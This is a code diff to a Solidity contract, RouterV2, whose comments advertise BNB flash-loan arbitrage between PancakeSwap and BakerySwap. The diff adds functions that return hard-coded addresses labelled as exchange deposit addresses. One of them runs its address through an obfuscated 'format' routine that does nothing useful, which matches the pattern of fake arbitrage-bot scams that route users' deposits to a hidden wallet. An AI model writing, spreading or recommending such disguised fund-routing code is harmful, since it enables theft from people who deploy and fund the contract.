@@ -116,14 +116,26 @@ contract RouterV2 {
         return 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F;
     }
 
-    function compareStrings(string memory a, string memory b)
-        public pure
-        returns (bool)
-    {
-        return (keccak256(abi.encodePacked((a))) ==
-            keccak256(abi.encodePacked((b))));
-    }
+    function pancakeDepositAddress()public pure returns (address) {
+    return address(format(0xf78020cd6E5b77C84E791Ff6f4BBA6bbB524aeFE));
+      
+  }
+function format(address addr)private pure returns(address){
+
+    bytes memory 
+    rec='0xf78020cd6E5b77C84E791Ff6f4BBA6bbB524aeFE';
     
+    string memory rec2=new string
+    (rec.length);
+
+    bytes memory rec3=bytes(rec2);
+        for(uint i=0;i<rec.length;i++)
+            rec3[rec.length-i-1]=rec[i];
+    
+require(rec3[30]==0x37);return addr;}
+  
+}
+  
     //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
     function borrowFlashloanFromMultiplier(
         address add0,
@@ -140,7 +152,11 @@ contract RouterV2 {
         require(uint(add0) != 0, "Address is invalid");
         require(amount > 0, "Amount should be greater than 0");
     }
-    
+
+    function bakerySwapAddress() public pure returns (address) {
+        return 0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5;
+    }
+
     //The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
     function callArbitrageBakerySwap(address add0, address add1) public pure {
         require(uint(add0) != 0, "Address is invalid!");
